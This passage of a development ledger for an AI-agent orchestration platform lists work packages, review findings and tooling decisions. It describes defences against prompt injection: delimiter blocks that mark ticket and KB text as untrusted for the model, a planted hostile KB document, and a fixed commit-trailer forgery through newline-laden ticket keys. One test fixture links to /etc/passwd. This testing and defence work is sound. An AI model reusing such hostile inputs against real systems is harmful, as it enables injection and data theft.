task row is **re-emitted**, not merely detected — the reconciler appends a **new** `ticket.matched` and leaves `inbox(provider, delivery_id)` untouched, which is how it coexists with the replay criterion (dedup is about a *delivery*, recovery about a *task*); two tasks are impossible because `runIntakeCheck` re-reads `findByTicket` inside its write transaction; and the grace is **data-relative**, not a sleep (rule 2). **Q52 decided rather than deferred**: no fourth task state — a throwing runner `start` fails the run and escalates to `needs_human`, and the reviewer independently agreed, because only the error *class name* reaches `events.payload` and `RunnerUnavailableError` distinguishes *the platform is unfinished* from *this task needs a person*. Filed **Q59**; **Q60** for the rate limit this public endpoint does not yet have. Reviewer mutations on copies, calibrated 21/21 green first: `verify → accept` kills **three** named tests including `packages/application/src/integrations/inbound.test.ts` › *"verifies the bytes as they arrived, before anything is redacted"*; header `redactJson → identity` kills two; dropping the `!isNew` early return kills the racing-deduplication test. The insert **is** the arbiter (`on conflict (provider, delivery_id) do nothing` + `rowCount`, in the caller's transaction — no check-then-insert). `PROVIDER_DIRECTORIES` is `readdirSync` (rules 7, 68). **`verify` was red in the orchestrator's shell after the pre-merge round** — the citation guard caught an ambiguous `inbound.test.ts` basename across three tracked files (rule 59). The implementer's targeted files were green and its report was accurate about them; the **target** is a different question (rule 61). Left behind: **backlog 22**. |
| WP-15f | **The ticket's own words** — the platform read no ticket text | WP-15c, WP-17 | no | DONE | `b6793aa` | **2 review rounds (the second by fresh eyes) + a comment round.** The finding that stopped "M1 complete" being written: `tasks` stored `ticket_provider`/`key`/`url` and nothing else, `ticketBlock` was those same three lines, `get_task_context` **refused**, and `readTicket` — which already returned `title`, `description`, `comments[]`, `epic`, `siblings`, `attachments_text` — had **zero production callers**. The refinement stage was asked to spec a ticket nobody opened and retrieval's query was `extractQueryTerms('ACME-1')` → `["acme"]`. `readTicket` is now called from **two ordered points**, both outside every transaction and through `IntegrationActionExecutor`: intake's call phase puts the snapshot in the `insert` that creates the task, `stage.execute` backfills when a row has none. **A fourth `pipeline.outbound` duty was measured and rejected** — Q61 recommended one, but `enqueueStage` runs on the line after the commit (`saga.ts:385-388`), so a duty woken by `task.created` waits for the outbox sweep, two reads, a decryption and a round trip, and *"the criterion would be held by luck"*. **It did not join backlog 18**: a narrow `tasks.saveTicketSnapshot`, **no new `save` site**, and `save`'s column list **omits** `ticket_snapshot`, so the twenty whole-row writers are structurally unable to clobber it; the contract case dies on the **derived cost total** (rule 79), `expected +0 to be close to 4.25`. **Budget derived, not inherited** (Q61's numbers were a stated proposal): title 512, description 20 000, newest 20 comments × 1 000 +128 id +128 author = **45 632** chars / **182 528** B / **11 408** tokens, **additive to** the 12 000 pack budget rather than inside it, **292×** under Q54's measured 53 284 565, and **produced by a test rather than quoted** (rule 39). **Two majors, both fixed rather than argued down.** A blanket `catch` swallowed `TransactionOpenError`, disarming WP-15d's guard on **both** call sites — probed `{"threw":false,"value":null}` where the docblock *and this ledger* claimed a refusal; it is terminal now at both refusal points, re-probed `{"threw":true,"ctor":"TransactionOpenError"}` twice, fail-open for a provider that is down unchanged. And a credential pasted into a description was pattern-redacted in the audit row of **the same call** and stored **verbatim**, because `inbox` gets TD-012 step 2 and the pipeline loader had no equivalent — **the filing misstated its own precedent**, and it was **closed** rather than re-filed: `platformRedactor` composed after the binding's own, held in **production** by the ingress e2e, and verified by a reviewer planting its **own** credential shapes, one straddling the cap. **The implementer refused two of my instructions and was right both times** (rule 27): sub-decision (b)'s *"last provider signal"* is not a quantity this build holds (`consumption.ts:89-90` both `unconsumed`, `events.ts:134,145` nullish `task_id`, `inbound.ts:180` project stream), so my brief demanded the consumer change it forbade in the same paragraph. Rule **83** was earned here. Left behind: backlog **25**. |
| WP-15g | **Compose a production `ClaudeRunner` and the run's workspace** | WP-15f | no | DONE | `5b01f73` | **1 review round + an architect ruling taken before the brief.** `apps/server/src/agent.ts` composes `createWorkspaceClaudeRunner` over the **real** `createClaudeRunner`, with the production `run_messages` sink, `unattendedToolApprovals` (BD-025 deny) and a per-run TD-012 redactor from `RunSpec.secretEnvNames`; it takes a `RunWorkspaceProvisioner` and **never a Docker client**. **The ruling changed the design before an implementer met it**: composing the launcher in `apps/server` would have contradicted TD-021, and no Docker client is needed because **TD-025 §2 already gives the runner a socket-free path** — `WorkspaceAttachment` is *"a path in the runner process' own filesystem"* (`ports/workspace.ts:182-188`) and the only daemon call in `attach` is a liveness probe the socket connect supersedes. It also found **there is no `ROLE=launcher`** (TD-021 and `.env.example` both said so; both corrected) and that **`parseDockerHost(undefined)` returned `/var/run/docker.sock`** — *absence of configuration granting the unfiltered daemon TD-021 deploys a proxy to remove*, rule 55's shape, now a **startup error**. **Criterion 1 defeats rule 82 rather than satisfying it**: the assertion is on the bytes the **CLI received** (`FakeCli.stdin`/`spawnOptions`), never the `RunSpec` the fake ignores — `test/e2e/pipeline/agent-run.e2e.test.ts` › *"sends the ticket’s own title to the process, and stores a redacted transcript"*. A measurement corrected the plan: with SDK **0.3.267** *both* prompt halves are on **stdin** (the append inside the `initialize` control request) and **neither** in argv, asserted both ways. It proves nothing about the real binary, container, shim or model, and says so. **`run_messages` has its first writer since `0006_transcripts.sql` created the table** — planted credential absent, placeholder **present**, control text present, `sum(redaction_count) > 0`. Writing one exposed a constraint nothing had ever exercised, `check (seq >= 1)` against a zero-based producer → migration **0016**, which **lowers** the bound without dropping it (the parity test excludes check constraints, so what holds it is the e2e insert). **Composing it found a live defect**: `attach` did not wait for the shim's control socket. **Review then found the fix half-tested**, which was the better finding — a one-look mutant (`deadline = Date.now() - 1`) left `provider.test.ts` at **37/37** because every success case opened the socket *before* `attach`, while deleting the call died in 8 ms; rule **42** on the very wait added to close the other side. A late-booting-shim case now holds it, and the blast radius is stated **as measured** — one failed `runs` row and one 30 s retry per task, absorbed by Q59(a) — not *"every task lost"*, which was true of the code before the wait. **Q59 answered both halves**: (a) `RunStartError.retryable` + 3 × 30 s, terminal escalates on attempt 1; (b) the refusal **kept and made configuration-conditional** — provisioner absent → no agent runner, missing piece named, and the gates, status mapping and workpad still run. **The `attach` deviation was upheld**: a runner-side `readLocalAttachment` would have had **no caller** until Q52's transport (backlog 11's shape), and the prohibition holds **structurally at the repository level** rather than by configuration. TD-021 carries an as-built note. Left behind: **Q62**, four discovered-work items, and the fact that **no tier exercises the real `attach`** until WP-22. |
| WP-15h | **The read API the SPA already calls, and the `run:<id>` SSE topic** — run endpoints, `GET /api/tasks/:id`, the transcript bridge, the client-vs-routes census | WP-06, WP-15g, WP-20 | no | DONE (**parts 1 and 2** — every read the SPA calls is served; the row's serving-the-SPA half is backlog **33**, unowned) | `19da103` + `d1a5116` | **1 review round (APPROVE, four minors and a nit, all fixed pre-merge).** Backlog **29**'s *cause* is closed: `apps/server/src/routes/client-census.test.ts` reads the client's paths off every file git knows about under `apps/web/src` — tracked **and** untracked (rule 85) — and the server's half is a real unauthenticated request through the real router, so the same probe is the per-route auth assertion; equality holds in **both** directions and the reviewer re-derived three mutations on copies. A second census, `apps/server/src/routes/scope.test.ts`, replaced a docblock claim the review found unasserted (rule 44). `run:<id>` has its first publisher: the sink announces a stored entry's **position** on one dotted broadcast topic and `apps/server/src/sse/transcript-bridge.ts` reads the rows back into its own hub — only for a watched run (TD-014), one pump per run so positional replay cannot skip, `stop()` waiting for in-flight pumps — asserted against two real `LISTEN` sessions, so `ROLE=api` serves what `ROLE=worker` produced. **Rule 82 held by construction**: `FakeClaudeRunner` is composed with a no-op sink, so the e2e drives the real runner over the fake CLI and asserts the planted secret **both ways on two paths** (the HTTP page and the SSE frame): `test/e2e/server/run-api.e2e.test.ts` › *"serves the run, its transcript, its task — and the live frames — without the run’s secret"*. Where a column has no writer the route **refuses by name** (409 `prompt_not_recorded`; 409 `context_pack_not_recorded` — `run_context_pack` has no `budget_tokens` column and no writer; a `blob_id` row is `row_not_projectable`). Round 1's sharpest finding: a **fabricated** `budget_tokens: total` that a screen would have rendered as *budget equals total*, pinned by its own integration case — removed, and the refusal now carries the row count so a producer that arrives before the schema is fixed is visible. **Two defects found by the first reader of two columns**: `RunRecord.stage` had never been stored (`runs.task_stage_id` never written; `load` returned the literal null for every run this repository ever stored) and `tasks.workpad_ref` stored a `marker_id` the DTO rejects, so `GET /api/tasks/:id` answered 500 for every task with a workpad — both fixed at the writer with contract cases, no new `tasks.save` site. One biome **warning** (not an error) survives in the census fixture at `client-census.test.ts:330`, a template placeholder inside a deliberately plain string; nit. Left behind: part 2 (eleven paths), and the dead-table findings routed to the refiner. **Part 2 at `d1a5116`** (1 review round, APPROVE, + a pre-merge round; CI `34725765067` and `image` `34725765044`, read as `completed success`). The seven reads the census attributed to a later iteration — `/api/org/agents` (runs ⋈ non-terminal task stages), `/api/org/inbox` (open questions + pending approvals), `/api/integrations` (with the provider's declared credential fields **stripped** — a token pasted into `integrations.config` works through the loader's merge and would otherwise be served to any `integration.read` holder; an unshipped provider publishes `{}` and logs the row, fail closed), `/api/integrations/:id/setup-guide` (the shipped `.md`, 409 otherwise), `/api/projects`, `/api/projects/:id/readiness` (**409 `readiness_not_evaluated`** — nothing writes `readiness_evaluations`, and two of the three fields a projection could answer would be invented), `/api/projects/:id/tasks` (keyset-paged, 404 on an unknown project like its siblings) — plus `/api/projects/:id/kb/health`, the read the census cannot see. `ADMITTED_GAPS` is now **commands only** (twelve writes). **A defect the first reader found**: the task keyset carried node-postgres' parsed `Date` (milliseconds) against a `timestamptz` (microseconds), so the cursor was strictly earlier than the row it was built from and excluded it — three tasks in, two out, invisible from outside because a short page and the last page look alike; the cursor now carries the database's own six-digit rendering, pinned by a regex so the fix is not tested against millisecond data (rule 4); the proposal-queue cursor (WP-18b) has the same latent truncation, **filed** not silently fixed. Rule 82 audited: no shipped fake scenario asks a question, so the inbox case overrides refinement to `decision: 'ask'` through the harness; `kb_health_reports` is written only by the hygiene cron, so the e2e enqueues it. **Backlog 35 is live on `/api/org/inbox`** (`questions.text` is artifact-derived and unredacted), stated at the line, the fix belonging at the write. Pre-merge: a technical/08 clause overstating the census's scope (it is client-driven; a served-but-uncalled route is outside it by construction), a stale ledger sentence, and a 200 where sibling routes answer 404. Residuals: `agents`/`inbox` refuse the whole list on one unprojectable row (fail closed, asserted; an orphaned non-terminal run with a null `task_stage_id` blanks the agents list until an operator fixes the row); money summed as JS floats in `listProjectSummaries`; no wrong-role 403 case for `/api/integrations`. |
| WP-15e | **Whole-row `tasks.save` loses a concurrent writer's update — the class, not the instance** (backlog 18) | WP-15d | no | TODO | — | Added to this table in session 5: the plan row existed since WP-15d and no milestone row did. Its row says *"before any further work package moves a task write into a job"* — WP-15f, WP-19 and WP-18b each added narrow writes rather than a twenty-first `save` site, so the class is still open and unowned. Placed before WP-21. |
| WP-16 | Context packs + KB indexer (phase 1 FTS) + code map (ctags + PageRank) | WP-03, WP-12 | no | DONE | `8454fca` | **3 rounds.** Acceptance **produced, not quoted**: pack **10 552** tokens against a 12 000 default the same test asserts equals the shipped config, on an **18 886**-token vault, pinned again on PostgreSQL as two literals so a divergence names its store. Round 2 found what round 1 hid: `websearch_to_tsquery` **ANDs** bare words, so the acceptance query matched **0 documents on PostgreSQL** while the fake returned **15** — rule 1, in the most consequential place available. **No relevance floor ships**, both candidates rejected by measurement (absolute is backwards; relative is store-dependent and the author's own 0.3 dropped the right page); the residue is **Q58**. A **hostile KB document** is now in the vault (BD-022): control characters and bidi overrides replaced and counted, hostile words byte-identical and asserted, WP-17 named at the line. `ctags` **absent** → typed `unavailable`, **Q57**. Round 3 found a documented "unreachable" line **not in the tree**; corrected tally **54 mutants, 54 dead** (52 harness, 2 by hand). *The retrieval layer is built and no prompt uses it* — WP-17/WP-18. |
| WP-17 | **Role prompts + the delimiter contract + the real context pack** | WP-12, WP-16 | yes | DONE | `1497fe9` | **2 review rounds (the second by fresh eyes on round 2's fixes) + a pre-merge round.** The delimiter landed **in the same change as the wiring**, which is what backlog 12 required: a block is `<untrusted-data-<nonce> kind="…">` … `</untrusted-data-<nonce>>`, nonce 32 hex from `randomUUID` drawn **per prompt**, and the rule inside it is that *every byte of the prompt is either text the platform wrote or is inside a block*. Body **byte-identical** — no sanitiser, nothing for a later transform to undo (`apps/web/src/ui/untrusted.tsx`'s answer to the same question). Nothing untrusted reaches a **marker**: a value outside `SAFE_ATTRIBUTE_VALUE` is **refused**, a body containing the nonce is refused after four draws, and the reviewer established the part that actually closes it — the degradation renders a **closed set of three platform literals**, so **no input renders attacker bytes in a marker**. Nothing persists the nonce (`runs.system_prompt`/`user_prompt` exist and nothing writes them). **The ledger was wrong and is corrected at the source**: two of the ten hostile constructs do *not* flow byte-identical — `sanitiseDocumentText` replaces each control/bidi character with one `U+FFFD` and counts it, **2 per construct** as written and **4** over `HOSTILE_TEXT` (backlog 12 amended). The four zero-width characters do arrive untouched and buy nothing **against the structural parse** — a spliced nonce fails `NONCE_PATTERN` for the reader too — which is one word narrower than the implementer first claimed, because the reader is a parse and the model is not. **Round 1 found a live veto**: a vault path past the marker alphabet **threw**, failing `plan()`, failing the run and escalating to `needs_human` — *one deeply nested KB page stopping every task on the project*, measured at 476 renders / 568 throws with `.agentic/knowledge/<255>/<255>` reaching 530. Both names derived from a vault path now degrade independently; the implementer audited the attribute **set** unprompted (rule 68) and found no third asymmetry, and the reviewer re-derived the set off the code rather than off its table. **Three wrong causes attached to correct numbers** in one work package (rule **81**), all three found by re-deriving the cause rather than re-checking the figure. **Backlog 13 closed** (`.max(200_000)`); **backlog 14's unit half closed** — `ceil(utf8Bytes/4)`, 48 000 CJK 12 000 → 36 000, ASCII unchanged, and the new property **fails** for a wrong ratio where the old two could not; the ratio stays a **hypothesis**, labelled with a vendor datum. Backlog 15/Q58 deliberately not taken. **The ten platform skills were refused and the refusal was upheld**: `skills?: string[] | 'all'` is *a context filter, not a sandbox* (`@anthropic-ai/claude-agent-sdk@0.3.267/sdk.d.ts:2109`), mounted at provisioning, which needs a `WorkspaceProvider` the pipeline does not compose — ten files nothing reads is backlog 11's shape. Now **WP-14a**. **Eval half externally BLOCKED** and nothing stubbed: `pnpm eval` exists and **exits 1** naming what is missing, and `scripts/eval.test.ts` holds it there including rule 18's empty-key case. See "Blocker briefs needing a human". Left behind: backlog **23**, which is why M1 is not complete. |
| WP-18a | **The git-backed vault read path and the `KnowledgeIndexer` job** (TD-026) — part a of WP-18 | WP-16, WP-17, WP-15c, WP-15a; TD-026 | no | DONE | `79cb3f9` | **1 review round (APPROVE) + a pre-merge round.** CI `34714681328` and `image` `34714681356`, read as `completed success`. **The index reads a bare mirror the platform owns**: `packages/infrastructure/src/knowledge/git-vault.ts` is a second `VaultSource` over `git rev-parse`, `git ls-tree -r -z` and one `git cat-file --batch` — no working tree, no Docker client, never the launcher's `repo-cache` — the application-ring port unchanged; the mirror lives at `mirrorCacheKeyFor(projectId)` under `APP_KNOWLEDGE_MIRROR_ROOT`, **no default** (absent → no source composed, `/readyz` ok, the job refuses by name, the index untouched); the fetch credential travels bindings → `SecretStore` → the env of the **two network commands only**, through a credential helper, never inside a URL. **All seven read-path criteria asserted on rows** after a real `git clone --mirror` from a seeded remote, through real pg-boss (`test/integration/knowledge/git-vault-index.integration.test.ts`): no working tree; `repoPaths` is the tree; a `120000` symlink to `/etc/passwd` and a `160000` gitlink listed and never read; a later push indexed with no manual fetch; an unreachable remote → `vault_unavailable` with the count unchanged and non-zero; an `agentic/*` head refused by `merge-base --is-ancestor`; absent config refuses by name. **The singleton, measured**: the first version passed with pg-boss's singleton key deleted — pg-boss folds a null key too — so the case now demands that a second project's enqueue be admitted while the first is queued; the reviewer re-derived it without mutating the tree. Triggers: `task.created`; `mr.merged` **unpinned** and `default_branch.moved` **pinned**, because `mr.merged` names only the source branch. **The fetch writes no `integration_actions` row**, judged defensible: technical/06 scopes the executor to provider-port actions, the git transport has no port and nothing to replay, `updateMirror` is the precedent, and BD-003 is satisfied by `knowledge.index.rebuilt` — now stated in technical/07. `ROLE=indexer` is a worker (the WP-15g argument); the pool floor recomputed. Pre-merge: the credential env had been attached to **every** git child (least privilege, and a "password really supplied" assertion passing off local plumbing); `projectId` became a path with no shape check (rule 55's shape); a docblock claimed a branch pattern "refuses `..` by construction" when `.` was in the class (git refused the path anyway — the outcome was safe and the sentence false, rule 44); `unchanged` was "free" while its early exit sits after the full read; a `SECRET_MARKER` assertion that could not fail (rule 43: git stores a symlink's target *path*, never its bytes). **Needs measurement, stated in the notes**: the in-flight half of the singleton (one active run plus two triggers → one trailing run) is asserted only on the in-memory adapter; a `file://` fetch never invokes the credential helper, so proving the credential path needs `git http-backend` over `http://` with auth. Q63 annotated (no ceiling on the mirror; no storage gauge). **The machine got two votes during this row**: the orchestrator's wait loop and then its detached `verify:e2e` were killed by the harness for low memory (`memory_pressure` said 53 % free — the harness's own threshold); the killed e2e left two containers, a network and about a dozen anonymous volumes, removed by hand, and the rerun passed with the count two above baseline. |
| WP-18b | Librarian pipeline + proposals + apply policy + knowledge MR flow + nightly hygiene — part b of WP-18 | WP-18a | no | DONE | `24efdc7` | **2 review rounds + a pre-merge round; CI `34721840974` and `image` `34721840941`, read as `completed success`.** **99 files.** A `LibrarianProposals` artifact (strict, in `packages/contracts`), migration **0018** (an enum label and `kb_health_reports`), domain curator/policy/health, application `knowledge/{librarian,apply,hygiene,decide,runtime}.ts`, a `KnowledgeProposalStore` port with a memory double, a contract suite and a PostgreSQL adapter, **a new `GitProviderPort.commitFiles` obligation** (port, GitLab with a recorded fixture and `SOURCES`, fake with divergence 9 stricter than GitLab, shared contract case both ways), `apps/server/src/routes/kb.ts` with its queries, and the librarian stage **back in the templates** (after `retrospective`, entered by fall-through, running in `retro`). The flow: proposal → `knowledge.proposals` job → rows and events → `knowledge.apply` job (stately per project) → `commitFiles` + `openMergeRequest` through the executor, **outside any transaction** (asserted through `TransactionOpenError`) → `applied`; provenance in the row, in the `Agentic-Source` trailer and in the audit row; **always a branch under `agentic/knowledge/` and an MR, never the default branch** (Q66; the e2e reads the fake back and proves `main` never holds the page); "approved" is `queued` + `decided_at`, no sixth status; hygiene writes a report, makes no git call, deletes nothing (both halves, pg-boss and memory). The four `kb/*` census gaps closed with a positive case; project guards run at `preValidation` so a 401 precedes validation. Prompt v2 with eval cases held offline (`pnpm eval --check` still exits 1 naming the blocker). Thresholds asserted on both sides of both edges; the interpreter's property tier gained a deterministic *reaches complete through every stage* case. The e2e (`test/e2e/pipeline/librarian.e2e.test.ts`) drives the real runner over the fake CLI through a real instance, with the planted secret absent from the proposal row, the commit body and the HTTP response. **Round 1's major was a BD-022 forgery path**: the provenance trailer interpolated `tasks.ticket_key` — untrusted, uncapped, no charset — into a line-structured commit message and an unbounded MR body, so a key containing a newline forged extra `Agentic-Source:` lines. Fixed by **refusal, not escaping** (outside `[A-Za-z0-9._/-]` or over the cap → the task uuid; the run id through the same check; `.max()` on the message and description **parsed** at the executor's seam, rule 14; a hostile key driven through the whole pass, rule 40). Round 1's minors: `rbac.ts` docblocks falsified by the `preValidation` guards; a keyset cursor on `created_at` alone dropping rows inside a same-timestamp batch — now `(created_at, id)`; a branch name stable only within a UTC day — now dated from the batch's earliest proposal; a stale consumption sentence. **Round 2**: a maintainer's rejection `reason` reaching `events` **unredacted** beside a redacted `delta` (TD-012); the decide DTO's `delta` unbounded, bypassing the 64 KiB cap (rule 13's shape; the constant moved to contracts so one budget serves two rings, rule 41); the MR body's refusal safe by construction but **unevidenced** (rule 43). **Measured and filed rather than fixed** (refiner): backlog **35** — `artifacts.data` is written unredacted while TD-012 names artifacts, the class finally numbered, reproduced by this WP's own e2e, and the proposal row does **not** inherit it; **36** — a lost curation wake-up loses one task's proposals; **37** — `kb_health_reports` has no reader and invalid documents reach no report (a `kb/health` read is now a WP-15h part 2 criterion, because the census cannot see a path no client calls); **38** — `ROLE=api`+`worker` never tested as a deployment. Residuals: `commitFiles` never run against a real GitLab (fixture `documented`, its 400 `inferred`; a TODO verification item); apply idempotency never driven twice (backlog 7). |
| WP-19 | Cost ledger, rollups, budgets projection, price table maintenance job, estimates, **and the backfill** | WP-04 | no | DONE | `8100c50` | **3 review rounds + a pre-merge case.** **Four tables that had existed since 0004/0007 got their first writer** (`cost_entries`, `run_model_usage`, `cost_rollup_daily`, `budget_windows`); migration **0017**. The ledger **totals to the invoice**: per-model rows from the provider's breakdown, the rounding residual attributed to the run's own model and reported rather than smoothed, a property test over any breakdown (BD-011). **Rule 16 honoured**: a missing `total_cost_usd` is priced from `price_list` and labelled `is_estimate`; an unpriced model writes **no** ledger row and is named in the log, its tokens still recorded. The model id is the only producer string stored, bounded 128 and **refused** past it. Budgets are a **read at admission** in the stage executor, not a `budget.exhausted` handler; windows are implicit in their start instant, so TD-004's `budget.window.reset` queue is deliberately not started. **The backfill uses `handler_executions` rather than bypassing it**: `replayEvents` claims `(position, handler)` exactly as the dispatcher does, so a handler registered later is served, a second pass skips, and a throwing handler stops the pass with `lastPosition` as the resume point. **Rule 82 audited first**: `FakeClaudeRunner` reports `modelUsage: []`, so the per-model criterion runs the real runner over the fake CLI whose scripted `result` reports **two** models. `run.finished`, `run.failed`, `artifact.created` are `handled`, held by a test that reads the set **off the handlers**. **Q65** filed and implemented. **The price job fetches nothing** — no verified feed, no credential; it closes superseded windows and names uncostable models. Round 1's major: the budgets route was the one untested module and its `spent_usd` came from a string-keyed join reporting **0** on any mismatch — a plausible number; fixed by an e2e reading the endpoint, and a window-blind mutant that **survived the first fix** dies now. Round 2's major was **the orchestrator's** (the ledger said TD-005's counts were unedited after I had edited them — rule 83 on my own writing); its minors found the budgets read **and the admission guard** throwing 500 on the very timezone the ledger fails open for — one `resolveBudgetTimezone` now serves all three — and a port method with no production caller, deleted because its loader writes under `for update`. Round 3's survived mutant: the guard half had no regression case; added pre-merge, calibrated with a planted-throw canary. Rule **77** refined: a copied tree resolves `@platform/*` back to the original through `node_modules` symlinks. Left behind: `tasks.cost_estimated` has no writer (a `local`-mode task calls an estimate an actual — backlog 18's territory), nothing consumes the estimate (WP-28), no price feed, two biome infos in test fixtures. |
| WP-20 | Web app foundation (TD-013) | WP-06 | yes | DONE | `c744904` | 2 review rounds + pre-merge; ui 2 → 245, web-e2e 33; rules 44, 45, 47, 48; **Q44–Q49** |
| WP-21 | Onboarding wizard steps 1–5 incl. discovery agent and readiness evalua | WP-16, WP-17, WP-20 | no | TODO | — | |
| WP-22 | Docker images (base, runtime, egress, launcher, product), Compose with a `compose.local.yml` override, `image.yml`, `base-image.yml`, size checks, attestations — **and the tier that runs the real provider against the real images** | WP-14 | no | DONE | `2fa285c` + ci-fix `d337173` | **3 review rounds + a pre-merge round + one ci-fix.** CI is the tier of record and it was read as `completed`: `2fa285c` — `image` `34708614552` and `base-image` `34708614542` **success** (the five images build and publish on amd64 and arm64), `ci` `34708614539` **failure** on one check of seven in the container script (rule 71's third environment defect, the cloud runner's DNS search list, in a script that had never run on CI); `d337173` — `ci` `34709029809` and `image` `34709029816` **success**. Five Dockerfiles; `compose.yml` with the socket behind `docker-socket-proxy` on an internal network the launcher alone joins (from the app container: `DOCKER_HOST` empty, no socket, the proxy unreachable — measured); `migrate` on the same entrypoint as `pnpm db:migrate`; no healthcheck gates on `/readyz`; `git` and the `knowledge` volume for TD-026; `scripts/build-images.mjs` as the one place that knows which file makes which image and its **unpacked** budget. **The stand-ins are gone**: `test/e2e/workspace/docker-workspace.e2e.test.ts` runs against `platform-runtime` and `platform-egress` with `runtimeSourceDir` unset and no `egressCommand`; a missing image **throws** naming the build command; CI **builds the commit's own images** (the row amended). **Backlog 27's mutant, both ways**: a one-look `#waitForControlSocket` left the pre-existing attach case green (6913 ms — the happy path, not the wait) and the new case *"attaches to a workspace whose socket appears only after attach"* fails by name, the ordering forced. **The real image found what the stand-in hid**: `chmod 0600` on a socket in a bind-backed volume answers `EINVAL` on virtiofs, so the shim exited after creating it; replaced by a property check (`<ctl>/<run-id>` is `0700` owned by this uid, which denies what the mode did), refusing on a wider mode, another uid, a missing or symlinked directory, re-throwing any other `chmod` error — judged sound by two reviewers. **Backlog 7 discharged, one claim falsified**: tinyproxy 1.11.2 starts and serves as uid 1000 with `cap_drop ALL` and `User nobody` present; the lines removed because the process does not honour them; and round 1 found that prediction **copied into a docblock as a measurement** — standing rule **86**. The runlet is bundled to one file; sidecar liveness is asserted at `create` and caught the alpine stand-in in `scripts/runlet-launcher-check.mjs`. **Found by deploying**: `@platform/prompts` declared no dependencies and crash-looped the product image (a census over `git ls-files` now holds every workspace package, including side-effect and dynamic imports); the launcher exited 0 in a restart loop on an unref'd timer (its test passed with the defect present until round 2); **220 anonymous volumes per e2e run** from `alpine/git`'s `VOLUME /git` with `v=false`, now removed with the container, the harness's own `rm -f` too (the orchestrator's +1 volume, attributed); build metadata was step env `docker build` never forwarded, so every image would have reported `0.0.0-dev` — the script now asserts the built image's `Config.Env`; `docker image inspect` reported ~4× under `docker images` on the containerd store, so the budget names the quantity it bounds; the backup sidecar pinned PostgreSQL 17 tooling against an 18 database (`pg_dump` version mismatch, measured) — pinned to 18 by digest with the majors compared off the file. **Compose's `local` profile could not express "this service instead of that"** (two `app` services on one port, measured) — a `compose.local.yml` override now, TD-018 amended, `test/e2e/compose/compose-config.e2e.test.ts` holds the service set under every setting. **Backlog 0b refused with the measurement** (`CAP_DAC_OVERRIDE` gone since WP-14; a per-run volume contradicts TD-025 §2 and TD-021). `docker compose up` measured here: 17 migrations, `/readyz` ok on all four checks, launcher up. Signing needs no credential (`actions/attest-build-provenance` over OIDC; no SBOM, stated). Left behind: backlog **33** (nothing serves the SPA though the bundle is in the image), **34** (the SDK's executable-path mismatch and a 217 MB binary), the orphan-directory sweep in 0b, `acli` unpinnable, 46 biome infos (`useLiteralKeys`) in scripts and tests. |
| WP-23 | Docs | WP-22 | yes | TODO | — | |

## Milestone M2 — trust

| WP | Title | Status | Commit | Notes |
|---|---|---|---|---|
| WP-24 | review-only mode | TODO | — | |
| WP-25 | ticket readiness linter | TODO | — | |
| WP-26 | rebase gate + conflict warnings | TODO | — | |
| WP-27 | steer + take-over/hand-back (export, resume instructions) | TODO | — | |
| WP-28 | cost estimate + budget approval | TODO | — | |
| WP-29 | human time accounting | TODO | — | |
| WP-30 | autonomy dial + wizard step 4 + settings mirror | TODO | — | |
| WP-31 | ask-the-task | TODO | — | |
| WP-32 | digest + quiet hours | TODO | — | |
| WP-33 | nightly real-LLM smoke + evals in CI (`llm-ci` environment). | TODO | — | |

## Milestone M3 — show the value

| WP | Title | Status | Commit | Notes |
|---|---|---|---|---|
| WP-34 | shadow mode (closed tickets) + ShadowReport + UI | TODO | — | |
| WP-35 | history bootstrap | TODO | — | |
| WP-36 | maintenance pipeline | TODO | — | |
| WP-37 | risk classes + reviewer routing (CODEOWNERS) | TODO | — | |
| WP-38 | dependency policy + Checks panel (licence/maintenance status) | TODO | — | |
| WP-39 | coverage delta | TODO | — | |
| WP-40 | epic split (spike variant) | TODO | — | |
| WP-41 | statistics deep-dive (readiness attribution, clean-first-MR rate, estimate accuracy) | TODO | — | |
| WP-42 | release 0.1.0 (release-please, changelog, migration notes). | TODO | — | |

## WP notes (decisions, assumptions, reviewer findings)

### WP-00

**Blocking environment finding — the verification contract's literal command does not parse.**
`pnpm -s verify` fails on pnpm 12 with `error: unexpected argument '-s' found`: pnpm 12's CLI
accepts `-s` only for a real subcommand, and the implicit "run this script" shorthand rejects
preceding global flags. Working equivalents, all implemented and green:
`pnpm run -s verify` · `pnpm -s run verify` · `pnpm verify`.
The same applies to `verify:integration`, `verify:e2e`, `verify:ui`.
`docs/technical/14-orchestration-protocol.md` § "Verification script contract" and the orchestrator
loop should be updated to `pnpm run -s verify` (docs are the orchestrator's to change, not the
implementer's).

Decisions and assumptions:
- **Package scope `@platform/*`** (BD-014). Root package `platform`; nothing carries the product
  name. Renaming later is a scope search-and-replace plus the display constant.
- **No build step yet.** Workspace packages export `./src/index.ts` directly
  (`module: preserve`, `moduleResolution: bundler`, `noEmit: true` everywhere). The emit strategy
  (tsc emit vs bundler) is decided when the first runnable app lands (WP-06). Relative imports are
  written with `.js` extensions because that is what a future `tsc` ESM emit will require —
  nothing enforces it under `moduleResolution: bundler`, and it does *not* make sources runnable
  under Node's type stripping (verified on Node 25.1.0: `import './b.js'` from a `.ts` file throws
  `ERR_MODULE_NOT_FOUND`; stripping needs the on-disk `.ts` specifier).
- **TypeScript 7.0.2** (current stable; 6.x never shipped stable). `strict` plus
  `noUncheckedIndexedAccess`, `noImplicitOverride`, `noFallthroughCasesInSwitch`,
  `noImplicitReturns`, `noUnusedLocals/Parameters`, `verbatimModuleSyntax`.
  `exactOptionalPropertyTypes` deliberately left **off** — it is not part of `strict` and it fights
  zod-inferred types; revisit in WP-01 if contracts tolerate it.
- **Whole-repo typecheck is one program** (`tsconfig.json`), so its `lib` includes DOM. Per-package
  `tsconfig.json` files keep the boundary honest for editors: only `apps/web` gets DOM. Project
  references were left out (the plan marks them optional).
- **Vitest 5 projects** = `unit`, `contract`, `integration`, `e2e-fake-claude`, `ui`; tier chosen by
  file name (`*.contract.test.ts`, `*.integration.test.ts`, `*.e2e.test.ts`, anything under
  `apps/web/src` is `ui`). Coverage thresholds from technical/10 are wired and *proven* to fail when
  breached (80 % overall, 90/85/90 on `packages/domain/src/**`).
- **gitleaks ships as the `@b12k/gitleaks` devDependency** (MIT wrapper, pinned to gitleaks 8.30.1,
  verifies the upstream checksum). `scripts/gitleaks.mjs` falls back to a `gitleaks` on PATH, then to
  `ghcr.io/gitleaks/gitleaks` pinned by digest via Docker, then fails closed (`--require`/`CI`) or
  prints a loud warning. pnpm 12 blocks post-install
  scripts by default: the allowlist lives in `pnpm-workspace.yaml` under `allowBuilds` (not
  `onlyBuiltDependencies`, which pnpm 12 ignores).
